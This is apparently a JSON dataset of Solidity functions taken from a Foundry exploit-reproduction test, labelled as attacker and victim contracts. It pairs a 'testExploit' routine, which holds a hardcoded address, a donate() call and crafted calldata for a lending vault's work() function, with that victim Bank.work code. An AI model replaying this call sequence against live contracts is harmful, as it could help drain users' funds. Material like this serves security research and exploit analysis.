[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 12_394_009); //fork bsc at block 12394009\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        emit log_named_decimal_uint(\"[Start] ETH Balance of attacker\", attacker.balance, 18);\n\n        bytes memory data =\n            hex\"00000000000000000000000081796c4602b82054a727527cd16119807b8c7608000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000600000000000000000000000002f755e8980f0c2e81681d82cccd1a4bd5b4d5d4600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\";\n\n        cheats.startPrank(0xCB36b1ee0Af68Dce5578a487fF2Da81282512233, 0xCB36b1ee0Af68Dce5578a487fF2Da81282512233);\n        (bool success, bytes memory result) = address(0x2f755e8980f0c2E81681D82CCCd1a4BD5b4D5D46).call{\n            value: 1_031_000_000_000_000_000_000\n        }(abi.encodeWithSignature(\"donate()\"));\n\n        vault.work{value: 100_000_000}(\n            0, 0x9EED7274Ea4b614ACC217e46727d377f7e6F9b24, 0, 100_000_000_000_000_000_000_000, data\n        );\n\n        emit log_named_decimal_uint(\"[End] ETH Balance of attacker\", attacker.balance, 18);\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "Bank",
    "source_type": "victim_contract",
    "function_name": "work",
    "original_code": "    function work(uint256 id, address goblin, uint256 loan, uint256 maxReturn, bytes calldata data)\n        external payable\n        onlyEOA accrue(msg.value) nonReentrant\n    {\n        // 1. Sanity check the input position, or add a new position of ID is 0.\n        if (id == 0) {\n            id = nextPositionID++;\n            positions[id].goblin = goblin;\n            positions[id].owner = msg.sender;\n        } else {\n            require(id < nextPositionID, \"bad position id\");\n            require(positions[id].goblin == goblin, \"bad position goblin\");\n            require(positions[id].owner == msg.sender, \"not position owner\");\n        }\n        emit Work(id, loan);\n        // 2. Make sure the goblin can accept more debt and remove the existing debt.\n        require(config.isGoblin(goblin), \"not a goblin\");\n        require(loan == 0 || config.acceptDebt(goblin), \"goblin not accept more debt\");\n        uint256 debt = _removeDebt(id).add(loan);\n        // 3. Perform the actual work, using a new scope to avoid stack-too-deep errors.\n        uint256 back;\n        {\n            uint256 sendETH = msg.value.add(loan);\n            require(sendETH <= address(this).balance, \"insufficient ETH in the bank\");\n            uint256 beforeETH = address(this).balance.sub(sendETH);\n            Goblin(goblin).work.value(sendETH)(id, msg.sender, debt, data);\n            back = address(this).balance.sub(beforeETH);\n        }\n        // 4. Check and update position debt.\n        uint256 lessDebt = Math.min(debt, Math.min(back, maxReturn));\n        debt = debt.sub(lessDebt);\n        if (debt > 0) {\n            require(debt >= config.minDebtSize(), \"too small debt size\");\n            uint256 health = Goblin(goblin).health(id);\n            uint256 workFactor = config.workFactor(goblin, debt);\n            require(health.mul(workFactor) >= debt.mul(10000), \"bad work factor\");\n            _addDebt(id, debt);\n        }\n        // 5. Return excess ETH back.\n        if (back > lessDebt) SafeToken.safeTransferETH(msg.sender, back - lessDebt);\n    }\n\n    /// @dev Kill the given to the position. Liquidate it immediately if killFactor condition is met.\n    /// @param id The position ID to be killed.\n",
    "description": ""
  }
]